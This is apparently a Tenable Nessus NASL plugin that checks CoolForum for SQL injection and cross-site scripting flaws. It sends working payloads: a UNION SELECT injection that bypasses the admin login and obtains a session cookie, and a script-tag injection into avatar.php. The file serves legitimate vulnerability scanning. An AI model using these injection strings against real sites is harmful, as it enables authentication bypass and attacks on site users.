#
# (C) Tenable Network Security
#
# 


  desc["english"] = "
The remote host is running a version of CoolForum that suffers from
multiple input validation vulnerabilities. 

  - Multiple SQL Injection Vulnerabilities
    Due to a failure to properly sanitize user-input supplied 
    through the 'pseudo' parameter of the 'admin/entete.php' script
    and the 'ilogin' parameter of the 'register.php' script, an
    attacker may be able to manipulate SQL queries and view
    arbitrary database contents.

  - A Cross-Site Scripting Vulnerability
    It is possible to inject arbitrary script and HTML code into the
    'img' paramater of the 'avatar.php' script. An attacker can
    exploit these flaws to cause code to run on a user's browser
    within the context of the remote site, enabling him to steal
    authentication cookies, access data recently submitted by the
    user, and the like.

Solution : Upgrade to a version of CoolForum 0.8.1 or greater.

Risk factor : Low to High";


if (description) {
  script_id(17597);
  script_version("$Revision: 1.3 $");

  script_cve_id("CAN-2005-0857", "CAN-2005-0858");
  script_bugtraq_id(12852);

  name["english"] = "CoolForum XSS and SQL Injection Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for cross-site scripting and SQL injection vulnerabilities in CoolForum";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


foreach dir (cgi_dirs()) {
  req = http_get(item:string(dir, "/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if (res == NULL) exit(0);

  # If it's CoolForum...
  if (egrep(string:res, pattern:"Powered by .*CoolForum")) {
    # Try the SQL injections.
    #
    # nb: these particular exploits may not be particularly
    #     interesting, but they at least demonstrate the 
    #     install is vulnerable.
    #
    # - requires PHP's magic_quotes to be off.
    postdata = string(
      "action=login&",
      "password=&",
      # nb: this forces a match for id=12345, user "nessus", who has
      #     an empty password and has already been confirmed. It
      #     does not, though, add the user to any databases.
      "pseudo='Union%20SELECT%20'12345','nessus','','','1'%20FROM%20CF_config%23"
    );
    req = string(
      "POST ",  dir, "/admin/entete.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req);
    # If we get a CoolForumID cookie, there's a problem.
    if (egrep(string:res, pattern:"^Set-Cookie: CoolForumID=")) {
      desc = str_replace(
        string:desc["english"],
        find:"Risk factor : Low to High",
        replace:"Risk factor : High"
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
    # - only in CoolForum 0.8 and it requires CoolForum's confirmation 
    #   by mail option to be enabled (it is by default).
    req = http_get(
      item:string(
        dir, 
        "/register.php?",
        "action=confirm&",
        # nb: this is an empty string encoded as md5; eg, 'md5("")'.
        "s=d41d8cd98f00b204e9800998ecf8427e&",
        # nb: this forces a match for id=12345, user "nessus", who has
        #     an empty password and has already been confirmed. It
        #     does not, though, add the user to any databases.
        "login='Union%20SELECT%20'12345','nessus','','','1'%20FROM%20CF_config%23"
      ), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
    # If the response indicates we've already confirmed, there's a problem.
    if (egrep(string:res, pattern:"<b>Op.+ration impossible, votre inscription a d.j. .t. confirm.e!</b>")) {
      desc = str_replace(
        string:desc["english"],
        find:"Risk factor : Low to High",
        replace:"Risk factor : High"
      );
      security_hole(port:port, data:desc);
      exit(0);
    }

    # Try an XSS exploit - a simple alert to display "Nessus was here".
    #
    # nb: this requires PHP's display_errors to be enabled.
    xss = "'><script>alert('Nessus was here');</script>";
    # nb: the url-encoded version is what we need to pass in.
    exss = "'%3E%3Cscript%3Ealert('Nessus%20was%20here')%3B%3C%2Fscript%3E";
    req = http_get(item:string(dir, "/avatar.php?img=", exss), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
    # If we see our XSS, there's a problem.
    if (egrep(string:res, pattern:xss)) {
      desc = str_replace(
        string:desc["english"],
        find:"Risk factor : Low to High",
        replace:"Risk factor : Low"
      );
      security_warning(port:port, data:desc);
      exit(0);
    }
  }
}
